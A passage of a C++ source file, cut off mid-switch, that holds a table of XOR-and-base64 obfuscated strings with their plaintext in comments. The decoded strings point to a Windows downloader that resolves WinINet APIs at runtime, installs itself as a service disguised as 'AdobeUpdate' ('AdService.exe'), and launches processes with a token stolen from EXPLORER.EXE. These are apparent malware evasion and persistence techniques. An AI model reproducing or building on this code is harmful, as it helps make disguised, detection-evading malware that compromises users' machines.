
////////////////////////////////////////////////
// Created by WinWakerString at 20170905142337
////////////////////////////////////////////////

#include "libstr.h"
#include "str.h"
#include <string>

char* szLibStrBuffers[1024] = {0};
CRITICAL_SECTION csLibCriticalSection;
BOOL bLibInitCriticalSection = FALSE;

char* GetLibStrById(int id)
{
	if (!bLibInitCriticalSection)
	{
		InitializeCriticalSection(&csLibCriticalSection);
		for (int i = 0; i < 1024; i++)
		{
			szLibStrBuffers[i] = NULL;
		}
		bLibInitCriticalSection = TRUE;
	}

	EnterCriticalSection(&csLibCriticalSection);

	if (true)
	{
		if (id < 0 || id >= 1024)
		{
			LeaveCriticalSection(&csLibCriticalSection);
			return "";
		}

		if (szLibStrBuffers[id] == NULL)
		{
			szLibStrBuffers[id] = new char[MAX_PATH];
			memset(szLibStrBuffers[id], 0, MAX_PATH);
			if (szLibStrBuffers[id] == NULL)
			{
				LeaveCriticalSection(&csLibCriticalSection);
				return "";
			}
		}
		else
		{
			LeaveCriticalSection(&csLibCriticalSection);
			return szLibStrBuffers[id];
		}
	}

	std::string encryptStr;

	switch(id)
	{
	case 401:
		// raw str -> "401@encode file fail, open exe file %s error\n"
		encryptStr = "MTo3OzAxdDI9ODF0MjU9OHh0OyQxOnQxLDF0Mj04MXRxJ3QxJiY7Jl4=";
		break;
	case 402:
		// raw str -> "402@encode file fail, open txt file %s error\n"
		encryptStr = "MTo3OzAxdDI9ODF0MjU9OHh0OyQxOnQgLCB0Mj04MXRxJ3QxJiY7Jl4=";
		break;
	case 403:
		// raw str -> "403@%s\n"
		encryptStr = "cSde";
		break;
	case 404:
		// raw str -> "404@encode file, encode64 rc %d\n"
		encryptStr = "MTo3OzAxdDI9ODF4dDE6NzswMWJgdCY3dHEwXg==";
		break;
	case 405:
		// raw str -> "405@encode file fails, encode64 rc %d < 0\n"
		encryptStr = "MTo3OzAxdDI9ODF0MjU9OCd4dDE6NzswMWJgdCY3dHEwdGh0ZF4=";
		break;
	case 406:
		// raw str -> "406@decode file fail, open txt file %s error\n"
		encryptStr = "MDE3OzAxdDI9ODF0MjU9OHh0OyQxOnQgLCB0Mj04MXRxJ3QxJiY7Jl4=";
		break;
	case 407:
		// raw str -> "407@decode file fail, open exe file %s error\n"
		encryptStr = "MDE3OzAxdDI9ODF0MjU9OHh0OyQxOnQxLDF0Mj04MXRxJ3QxJiY7Jl4=";
		break;
	case 408:
		// raw str -> "408@decode file, decode64 rc %d\n"
		encryptStr = "MDE3OzAxdDI9ODF4dDAxNzswMWJgdCY3dHEwXg==";
		break;
	case 409:
		// raw str -> "409@decode file fails, decode64 rc %d < 0\n"
		encryptStr = "MDE3OzAxdDI9ODF0MjU9OCd4dDAxNzswMWJgdCY3dHEwdGh0ZF4=";
		break;
	case 410:
		// raw str -> "410@check if file exists, open %s fails, file not exist\n"
		encryptStr = "NzwxNz90PTJ0Mj04MXQxLD0nICd4dDskMTp0cSd0MjU9OCd4dDI9ODF0OjsgdDEsPScgXg==";
		break;
	case 411:
		// raw str -> "411@check if file exists, %s size match %d, file exist\n"
		encryptStr = "NzwxNz90PTJ0Mj04MXQxLD0nICd4dHEndCc9LjF0OTUgNzx0cTB4dDI9ODF0MSw9JyBe";
		break;
	case 412:
		// raw str -> "412@check if file exists, %s size mismatch %d %d, file exist\n"
		encryptStr = "NzwxNz90PTJ0Mj04MXQxLD0nICd4dHEndCc9LjF0OT0nOTUgNzx0cTB0cTB4dDI9ODF0MSw9JyBe";
		break;
	case 413:
		// raw str -> "413@\Temp"
		encryptStr = "CAAxOSQ=";
		break;
	case 414:
		// raw str -> "414@download file error, open file %s fails\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXQxJiY7Jnh0OyQxOnQyPTgxdHEndDI1PTgnXg==";
		break;
	case 415:
		// raw str -> "415@download file error, crack url fails, url %s, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXQxJiY7Jnh0NyY1Nz90ISY4dDI1PTgneHQhJjh0cSd4dDEmJjsmdHEwXg==";
		break;
	case 416:
		// raw str -> "416@Microsoft Internet Explorer"
		encryptStr = "GT03JjsnOzIgdB06IDEmOjEgdBEsJDg7JjEm";
		break;
	case 417:
		// raw str -> "417@download file error, open http fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXQxJiY7Jnh0OyQxOnQ8ICAkdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 418:
		// raw str -> "418@download file error, open http connect fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXQxJiY7Jnh0OyQxOnQ8ICAkdDc7OjoxNyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 419:
		// raw str -> "419@download file error, open http request fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXQxJiY7Jnh0OyQxOnQ8ICAkdCYxJSExJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 420:
		// raw str -> "420@download file error, send http request fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXQxJiY7Jnh0JzE6MHQ8ICAkdCYxJSExJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 421:
		// raw str -> "421@download file error, http query info fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXQxJiY7Jnh0PCAgJHQlITEmLXQ9OjI7dDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 422:
		// raw str -> "422@download file error, http return not ok, %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXQxJiY7Jnh0PCAgJHQmMSAhJjp0OjsgdDs/eHRxMF4=";
		break;
	case 423:
		// raw str -> "423@download file, query content length %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXh0JSExJi10Nzs6IDE6IHQ4MTozIDx0cTBe";
		break;
	case 424:
		// raw str -> "424@download file, query content length fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXh0JSExJi10Nzs6IDE6IHQ4MTozIDx0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 425:
		// raw str -> "425@download file, query content type %s\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXh0JSExJi10Nzs6IDE6IHQgLSQxdHEnXg==";
		break;
	case 426:
		// raw str -> "426@download file, query content type fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXh0JSExJi10Nzs6IDE6IHQgLSQxdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 427:
		// raw str -> "427@download file, total length %d, written %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXh0IDsgNTh0ODE6MyA8dHEweHQjJj0gIDE6dHEwXg==";
		break;
	case 428:
		// raw str -> "428@download file, read file fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MXh0JjE1MHQyPTgxdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 429:
		// raw str -> "429@get error, crack url fails, url %s, error %d\n"
		encryptStr = "MzEgdDEmJjsmeHQ3JjU3P3QhJjh0MjU9OCd4dCEmOHRxJ3h0MSYmOyZ0cTBe";
		break;
	case 430:
		// raw str -> "430@Microsoft Internet Explorer"
		encryptStr = "GT03JjsnOzIgdB06IDEmOjEgdBEsJDg7JjEm";
		break;
	case 431:
		// raw str -> "431@get error, open http fails, error %d\n"
		encryptStr = "MzEgdDEmJjsmeHQ7JDE6dDwgICR0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 432:
		// raw str -> "432@get error, open http connect fails, error %d\n"
		encryptStr = "MzEgdDEmJjsmeHQ7JDE6dDwgICR0Nzs6OjE3IHQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 433:
		// raw str -> "433@get error, open http request fails, error %d\n"
		encryptStr = "MzEgdDEmJjsmeHQ7JDE6dDwgICR0JjElITEnIHQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 434:
		// raw str -> "434@get error, send http request fails, error %d\n"
		encryptStr = "MzEgdDEmJjsmeHQnMTowdDwgICR0JjElITEnIHQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 435:
		// raw str -> "435@get error, http query info fails, error %d\n"
		encryptStr = "MzEgdDEmJjsmeHQ8ICAkdCUhMSYtdD06Mjt0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 436:
		// raw str -> "436@get error, http return not ok, %d\n"
		encryptStr = "MzEgdDEmJjsmeHQ8ICAkdCYxICEmOnQ6OyB0Oz94dHEwXg==";
		break;
	case 437:
		// raw str -> "437@get, query content length %d\n"
		encryptStr = "MzEgeHQlITEmLXQ3OzogMTogdDgxOjMgPHRxMF4=";
		break;
	case 438:
		// raw str -> "438@get, query content length fails, error %d\n"
		encryptStr = "MzEgeHQlITEmLXQ3OzogMTogdDgxOjMgPHQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 439:
		// raw str -> "439@get, query content type %s\n"
		encryptStr = "MzEgeHQlITEmLXQ3OzogMTogdCAtJDF0cSde";
		break;
	case 440:
		// raw str -> "440@get, query content type fails, error %d\n"
		encryptStr = "MzEgeHQlITEmLXQ3OzogMTogdCAtJDF0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 441:
		// raw str -> "441@Content-Type: application/x-www-form-urlencoded"
		encryptStr = "Fzs6IDE6IHkALSQxbnQ1JCQ4PTc1ID07OnsseSMjI3kyOyY5eSEmODE6NzswMTA=";
		break;
	case 442:
		// raw str -> "442@post error, crack url fails, url %s, error %d\n"
		encryptStr = "JDsnIHQxJiY7Jnh0NyY1Nz90ISY4dDI1PTgneHQhJjh0cSd4dDEmJjsmdHEwXg==";
		break;
	case 443:
		// raw str -> "443@Microsoft Internet Explorer"
		encryptStr = "GT03JjsnOzIgdB06IDEmOjEgdBEsJDg7JjEm";
		break;
	case 444:
		// raw str -> "444@post error, open http fails, error %d\n"
		encryptStr = "JDsnIHQxJiY7Jnh0OyQxOnQ8ICAkdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 445:
		// raw str -> "445@post error, open http connect fails, error %d\n"
		encryptStr = "JDsnIHQxJiY7Jnh0OyQxOnQ8ICAkdDc7OjoxNyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 446:
		// raw str -> "446@post error, open http request fails, error %d\n"
		encryptStr = "JDsnIHQxJiY7Jnh0OyQxOnQ8ICAkdCYxJSExJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 447:
		// raw str -> "447@post error, send http request fails, error %d\n"
		encryptStr = "JDsnIHQxJiY7Jnh0JzE6MHQ8ICAkdCYxJSExJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 448:
		// raw str -> "448@post error, http query info fails, error %d\n"
		encryptStr = "JDsnIHQxJiY7Jnh0PCAgJHQlITEmLXQ9OjI7dDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 449:
		// raw str -> "449@post error, http return not ok, %d\n"
		encryptStr = "JDsnIHQxJiY7Jnh0PCAgJHQmMSAhJjp0OjsgdDs/eHRxMF4=";
		break;
	case 450:
		// raw str -> "450@post, query content length %d\n"
		encryptStr = "JDsnIHh0JSExJi10Nzs6IDE6IHQ4MTozIDx0cTBe";
		break;
	case 451:
		// raw str -> "451@post, query content length fails, error %d\n"
		encryptStr = "JDsnIHh0JSExJi10Nzs6IDE6IHQ4MTozIDx0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 452:
		// raw str -> "452@post, query content type %s\n"
		encryptStr = "JDsnIHh0JSExJi10Nzs6IDE6IHQgLSQxdHEnXg==";
		break;
	case 453:
		// raw str -> "453@post, query content type fails, error %d\n"
		encryptStr = "JDsnIHh0JSExJi10Nzs6IDE6IHQgLSQxdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 454:
		// raw str -> "454@dll already loaded, ignored\n"
		encryptStr = "MDg4dDU4JjE1MC10ODs1MDEweHQ9Mzo7JjEwXg==";
		break;
	case 455:
		// raw str -> "455@load dll fails, error %d\n"
		encryptStr = "ODs1MHQwODh0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 456:
		// raw str -> "456@InternetCrackUrlA"
		encryptStr = "HTogMSY6MSAXJjU3PwEmOBU=";
		break;
	case 457:
		// raw str -> "457@get proc address fails, error %d\n"
		encryptStr = "MzEgdCQmOzd0NTAwJjEnJ3QyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 458:
		// raw str -> "458@InternetOpenA"
		encryptStr = "HTogMSY6MSAbJDE6FQ==";
		break;
	case 459:
		// raw str -> "459@InternetConnectA"
		encryptStr = "HTogMSY6MSAXOzo6MTcgFQ==";
		break;
	case 460:
		// raw str -> "460@InternetReadFile"
		encryptStr = "HTogMSY6MSAGMTUwEj04MQ==";
		break;
	case 461:
		// raw str -> "461@InternetCloseHandle"
		encryptStr = "HTogMSY6MSAXODsnMRw1OjA4MQ==";
		break;
	case 462:
		// raw str -> "462@HttpOpenRequestA"
		encryptStr = "HCAgJBskMToGMSUhMScgFQ==";
		break;
	case 463:
		// raw str -> "463@HttpSendRequestA"
		encryptStr = "HCAgJAcxOjAGMSUhMScgFQ==";
		break;
	case 464:
		// raw str -> "464@HttpQueryInfoA"
		encryptStr = "HCAgJAUhMSYtHToyOxU=";
		break;
	case 465:
		// raw str -> "465@download file2 error, open file %s fails\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ0MSYmOyZ4dDskMTp0Mj04MXRxJ3QyNT04J14=";
		break;
	case 466:
		// raw str -> "466@download file2 error, crack url fails, url %s, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ0MSYmOyZ4dDcmNTc/dCEmOHQyNT04J3h0ISY4dHEneHQxJiY7JnRxMF4=";
		break;
	case 467:
		// raw str -> "467@Microsoft Internet Explorer"
		encryptStr = "GT03JjsnOzIgdB06IDEmOjEgdBEsJDg7JjEm";
		break;
	case 468:
		// raw str -> "468@download file2 error, open http fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ0MSYmOyZ4dDskMTp0PCAgJHQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 469:
		// raw str -> "469@download file2 error, open http connect fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ0MSYmOyZ4dDskMTp0PCAgJHQ3Ozo6MTcgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 470:
		// raw str -> "470@download file2 error, open http request fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ0MSYmOyZ4dDskMTp0PCAgJHQmMSUhMScgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 471:
		// raw str -> "471@download file2 error, send http request fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ0MSYmOyZ4dCcxOjB0PCAgJHQmMSUhMScgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 472:
		// raw str -> "472@download file2 error, http query info fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ0MSYmOyZ4dDwgICR0JSExJi10PToyO3QyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 473:
		// raw str -> "473@download file2 error, http return not ok, %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ0MSYmOyZ4dDwgICR0JjEgISY6dDo7IHQ7P3h0cTBe";
		break;
	case 474:
		// raw str -> "474@download file2, query content length %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ4dCUhMSYtdDc7OiAxOiB0ODE6MyA8dHEwXg==";
		break;
	case 475:
		// raw str -> "475@download file2, query content length fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ4dCUhMSYtdDc7OiAxOiB0ODE6MyA8dDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 476:
		// raw str -> "476@download file2, query content type %s\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ4dCUhMSYtdDc7OiAxOiB0IC0kMXRxJ14=";
		break;
	case 477:
		// raw str -> "477@download file2, query content type fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ4dCUhMSYtdDc7OiAxOiB0IC0kMXQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 478:
		// raw str -> "478@download file2, total length %d, written %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ4dCA7IDU4dDgxOjMgPHRxMHh0IyY9ICAxOnRxMF4=";
		break;
	case 479:
		// raw str -> "479@download file2, read file fails, error %d\n"
		encryptStr = "MDsjOjg7NTB0Mj04MWZ4dCYxNTB0Mj04MXQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 480:
		// raw str -> "480@get2 error, crack url fails, url %s, error %d\n"
		encryptStr = "MzEgZnQxJiY7Jnh0NyY1Nz90ISY4dDI1PTgneHQhJjh0cSd4dDEmJjsmdHEwXg==";
		break;
	case 481:
		// raw str -> "481@Microsoft Internet Explorer"
		encryptStr = "GT03JjsnOzIgdB06IDEmOjEgdBEsJDg7JjEm";
		break;
	case 482:
		// raw str -> "482@get2 error, open http fails, error %d\n"
		encryptStr = "MzEgZnQxJiY7Jnh0OyQxOnQ8ICAkdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 483:
		// raw str -> "483@get2 error, open http connect fails, error %d\n"
		encryptStr = "MzEgZnQxJiY7Jnh0OyQxOnQ8ICAkdDc7OjoxNyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 484:
		// raw str -> "484@get2 error, open http request fails, error %d\n"
		encryptStr = "MzEgZnQxJiY7Jnh0OyQxOnQ8ICAkdCYxJSExJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 485:
		// raw str -> "485@get2 error, send http request fails, error %d\n"
		encryptStr = "MzEgZnQxJiY7Jnh0JzE6MHQ8ICAkdCYxJSExJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 486:
		// raw str -> "486@get2 error, http query info fails, error %d\n"
		encryptStr = "MzEgZnQxJiY7Jnh0PCAgJHQlITEmLXQ9OjI7dDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 487:
		// raw str -> "487@get2 error, http return not ok, %d\n"
		encryptStr = "MzEgZnQxJiY7Jnh0PCAgJHQmMSAhJjp0OjsgdDs/eHRxMF4=";
		break;
	case 488:
		// raw str -> "488@get2, query content length %d\n"
		encryptStr = "MzEgZnh0JSExJi10Nzs6IDE6IHQ4MTozIDx0cTBe";
		break;
	case 489:
		// raw str -> "489@get2, query content length fails, error %d\n"
		encryptStr = "MzEgZnh0JSExJi10Nzs6IDE6IHQ4MTozIDx0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 490:
		// raw str -> "490@get2, query content type %s\n"
		encryptStr = "MzEgZnh0JSExJi10Nzs6IDE6IHQgLSQxdHEnXg==";
		break;
	case 491:
		// raw str -> "491@get2, query content type fails, error %d\n"
		encryptStr = "MzEgZnh0JSExJi10Nzs6IDE6IHQgLSQxdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 492:
		// raw str -> "492@Content-Type: application/x-www-form-urlencoded"
		encryptStr = "Fzs6IDE6IHkALSQxbnQ1JCQ4PTc1ID07OnsseSMjI3kyOyY5eSEmODE6NzswMTA=";
		break;
	case 493:
		// raw str -> "493@post2 error, crack url fails, url %s, error %d\n"
		encryptStr = "JDsnIGZ0MSYmOyZ4dDcmNTc/dCEmOHQyNT04J3h0ISY4dHEneHQxJiY7JnRxMF4=";
		break;
	case 494:
		// raw str -> "494@Microsoft Internet Explorer"
		encryptStr = "GT03JjsnOzIgdB06IDEmOjEgdBEsJDg7JjEm";
		break;
	case 495:
		// raw str -> "495@post2 error, open http fails, error %d\n"
		encryptStr = "JDsnIGZ0MSYmOyZ4dDskMTp0PCAgJHQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 496:
		// raw str -> "496@post2 error, open http connect fails, error %d\n"
		encryptStr = "JDsnIGZ0MSYmOyZ4dDskMTp0PCAgJHQ3Ozo6MTcgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 497:
		// raw str -> "497@post2 error, open http request fails, error %d\n"
		encryptStr = "JDsnIGZ0MSYmOyZ4dDskMTp0PCAgJHQmMSUhMScgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 498:
		// raw str -> "498@post2 error, send http request fails, error %d\n"
		encryptStr = "JDsnIGZ0MSYmOyZ4dCcxOjB0PCAgJHQmMSUhMScgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 499:
		// raw str -> "499@post2 error, http query info fails, error %d\n"
		encryptStr = "JDsnIGZ0MSYmOyZ4dDwgICR0JSExJi10PToyO3QyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 500:
		// raw str -> "500@post2 error, http return not ok, %d\n"
		encryptStr = "JDsnIGZ0MSYmOyZ4dDwgICR0JjEgISY6dDo7IHQ7P3h0cTBe";
		break;
	case 501:
		// raw str -> "501@post2, query content length %d\n"
		encryptStr = "JDsnIGZ4dCUhMSYtdDc7OiAxOiB0ODE6MyA8dHEwXg==";
		break;
	case 502:
		// raw str -> "502@post2, query content length fails, error %d\n"
		encryptStr = "JDsnIGZ4dCUhMSYtdDc7OiAxOiB0ODE6MyA8dDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 503:
		// raw str -> "503@post2, query content type %s\n"
		encryptStr = "JDsnIGZ4dCUhMSYtdDc7OiAxOiB0IC0kMXRxJ14=";
		break;
	case 504:
		// raw str -> "504@post2, query content type fails, error %d\n"
		encryptStr = "JDsnIGZ4dCUhMSYtdDc7OiAxOiB0IC0kMXQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 505:
		// raw str -> "505@SYSTEM\CurrentControlSet\Services\AdobeUpdate"
		encryptStr = "Bw0HABEZCBchJiYxOiAXOzogJjs4BzEgCAcxJiI9NzEnCBUwOzYxASQwNSAx";
		break;
	case 506:
		// raw str -> "506@ImagePath"
		encryptStr = "HTk1MzEENSA8";
		break;
	case 507:
		// raw str -> "507@\AdService.exe"
		encryptStr = "CBUwBzEmIj03MXoxLDE=";
		break;
	case 508:
		// raw str -> "508@read reg key value, query key value fails, error %d\n"
		encryptStr = "JjE1MHQmMTN0PzEtdCI1OCExeHQlITEmLXQ/MS10IjU4ITF0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 509:
		// raw str -> "509@read reg key value, open key fails, error %d\n"
		encryptStr = "JjE1MHQmMTN0PzEtdCI1OCExeHQ7JDE6dD8xLXQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 510:
		// raw str -> "510@SYSTEM\CurrentControlSet\Services"
		encryptStr = "Bw0HABEZCBchJiYxOiAXOzogJjs4BzEgCAcxJiI9NzEn";
		break;
	case 511:
		// raw str -> "511@Type"
		encryptStr = "AC0kMQ==";
		break;
	case 512:
		// raw str -> "512@write value %s fails, error %d\n"
		encryptStr = "IyY9IDF0IjU4ITF0cSd0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 513:
		// raw str -> "513@Start"
		encryptStr = "ByA1JiA=";
		break;
	case 514:
		// raw str -> "514@LocalSystem"
		encryptStr = "GDs3NTgHLScgMTk=";
		break;
	case 515:
		// raw str -> "515@ObjectName"
		encryptStr = "GzY+MTcgGjU5MQ==";
		break;
	case 516:
		// raw str -> "516@ImagePath"
		encryptStr = "HTk1MzEENSA8";
		break;
	case 517:
		// raw str -> "517@ErrorControl"
		encryptStr = "ESYmOyYXOzogJjs4";
		break;
	case 518:
		// raw str -> "518@DisplayName"
		encryptStr = "ED0nJDg1LRo1OTE=";
		break;
	case 519:
		// raw str -> "519@create service registration ok\n"
		encryptStr = "NyYxNSAxdCcxJiI9NzF0JjEzPScgJjUgPTs6dDs/Xg==";
		break;
	case 520:
		// raw str -> "520@create key %s fails, error %d\n"
		encryptStr = "NyYxNSAxdD8xLXRxJ3QyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 521:
		// raw str -> "521@open key %s fails, error %d\n"
		encryptStr = "OyQxOnQ/MS10cSd0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 522:
		// raw str -> "522@CreateToolhelp32Snapshot fails, error %d\n"
		encryptStr = "FyYxNSAxADs7ODwxOCRnZgc6NSQnPDsgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 523:
		// raw str -> "523@Process32First fails, error %d\n"
		encryptStr = "BCY7NzEnJ2dmEj0mJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 524:
		// raw str -> "524@CreateToolhelp32Snapshot fails, error %d\n"
		encryptStr = "FyYxNSAxADs7ODwxOCRnZgc6NSQnPDsgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 525:
		// raw str -> "525@OpenProcessToken fails, error %d\n"
		encryptStr = "GyQxOgQmOzcxJycAOz8xOnQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 526:
		// raw str -> "526@Process32First fails, error %d\n"
		encryptStr = "BCY7NzEnJ2dmEj0mJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 527:
		// raw str -> "527@wait process %s to exit, get signal\n"
		encryptStr = "IzU9IHQkJjs3MScndHEndCA7dDEsPSB4dDMxIHQnPTM6NThe";
		break;
	case 528:
		// raw str -> "528@wait process %s to exit, time out %d\n"
		encryptStr = "IzU9IHQkJjs3MScndHEndCA7dDEsPSB4dCA9OTF0OyEgdHEwXg==";
		break;
	case 529:
		// raw str -> "529@wait process %s to exit, failed, break\n"
		encryptStr = "IzU9IHQkJjs3MScndHEndCA7dDEsPSB4dDI1PTgxMHh0NiYxNT9e";
		break;
	case 530:
		// raw str -> "530@wait process %s to exit, finish, bRunning %d, bExit %d\n"
		encryptStr = "IzU9IHQkJjs3MScndHEndCA7dDEsPSB4dDI9Oj0nPHh0NgYhOjo9OjN0cTB4dDYRLD0gdHEwXg==";
		break;
	case 531:
		// raw str -> "531@terminate process %s\n"
		encryptStr = "IDEmOT06NSAxdCQmOzcxJyd0cSde";
		break;
	case 532:
		// raw str -> "532@EXPLORER.EXE"
		encryptStr = "EQwEGBsGEQZ6EQwR";
		break;
	case 533:
		// raw str -> "533@GetTokenByName fails, error %d\n"
		encryptStr = "EzEgADs/MToWLRo1OTF0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 534:
		// raw str -> "534@DuplicateTokenEx fails, error %d\n"
		encryptStr = "ECEkOD03NSAxADs/MToRLHQyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 535:
		// raw str -> "535@CreateProcessAsUser %s ok\n"
		encryptStr = "FyYxNSAxBCY7NzEnJxUnAScxJnRxJ3Q7P14=";
		break;
	case 536:
		// raw str -> "536@CreateProcessAsUser %s fails, error %d\n"
		encryptStr = "FyYxNSAxBCY7NzEnJxUnAScxJnRxJ3QyNT04J3h0MSYmOyZ0cTBe";
		break;
	case 537:
		// raw str -> "537@wait process %s to exit, get signal\n"
		encryptStr = "IzU9IHQkJjs3MScndHEndCA7dDEsPSB4dDMxIHQnPTM6NThe";
		break;
	case 538:
		// raw str -> "538@wait process %s to exit, time out %d\n"
		encryptStr = "IzU9IHQkJjs3MScndHEndCA7dDEsPSB4dCA9OTF0OyEgdHEwXg==";
		break;
	case 539:
		// raw str -> "539@wait process %s to exit, failed, break\n"
		encryptStr = "IzU9IHQkJjs3MScndHEndCA7dDEsPSB4dDI1PTgxMHh0NiYxNT9e";
		break;
	case 540:
		// raw str -> "540@wait process %s to exit, finish, bRunning %d, bExit %d\n"
		encryptStr = "IzU9IHQkJjs3MScndHEndCA7dDEsPSB4dDI9Oj0nPHh0NgYhOjo9OjN0cTB4dDYRLD0gdHEwXg==";
		break;
	case 541:
		// raw str -> "541@terminate process %s\n"
		encryptStr = "IDEmOT06NSAxdCQmOzcxJyd0cSde";
		break;
	case 542:
		// raw str -> "542@CreateToolhelp32Snapshot fails, error %d\n"
		encryptStr = "FyYxNSAxADs7ODwxOCRnZgc6NSQnPDsgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 543:
		// raw str -> "543@Terminate process %s ok\n"
		encryptStr = "ADEmOT06NSAxdCQmOzcxJyd0cSd0Oz9e";
		break;
	case 544:
		// raw str -> "544@Terminate process %s fails, error %d\n"
		encryptStr = "ADEmOT06NSAxdCQmOzcxJyd0cSd0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 545:
		// raw str -> "545@Process32First fails, error %d\n"
		encryptStr = "BCY7NzEnJ2dmEj0mJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 546:
		// raw str -> "546@CreateToolhelp32Snapshot fails, error %d\n"
		encryptStr = "FyYxNSAxADs7ODwxOCRnZgc6NSQnPDsgdDI1PTgneHQxJiY7JnRxMF4=";
		break;
	case 547:
		// raw str -> "547@Terminate process %s ok\n"
		encryptStr = "ADEmOT06NSAxdCQmOzcxJyd0cSd0Oz9e";
		break;
	case 548:
		// raw str -> "548@Terminate process %s fails, error %d\n"
		encryptStr = "ADEmOT06NSAxdCQmOzcxJyd0cSd0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 549:
		// raw str -> "549@Process32First fails, error %d\n"
		encryptStr = "BCY7NzEnJ2dmEj0mJyB0MjU9OCd4dDEmJjsmdHEwXg==";
		break;
	case 550:
		// raw str -> "550@winsta0\default"
		encryptStr = "Iz06JyA1ZAgwMTI1ITgg";
		break;
	case 551:
		// raw str -> "551@S %d %d %02d:%02d:%02d :"
		encryptStr = "B3RxMHRxMHRxZGYwbnFkZjBucWRmMHRu";
		break;
	case 552:
		// raw str -> "552@%d\n"
		encryptStr = "cTBe";
		break;
	case 553:
		// raw str -> "553@decode fails, key not fould\n"
		encryptStr = "MDE3OzAxdDI1PTgneHQ/MS10OjsgdDI7ITgwXg==";
		break;
	case 554:
		// raw str -> "554@wait process 0x%x to exit, get signal\n"
		encryptStr = "IzU9IHQkJjs3MScndGQscSx0IDt0MSw9IHh0MzEgdCc9Mzo1OF4=";
		break;
	case 555:
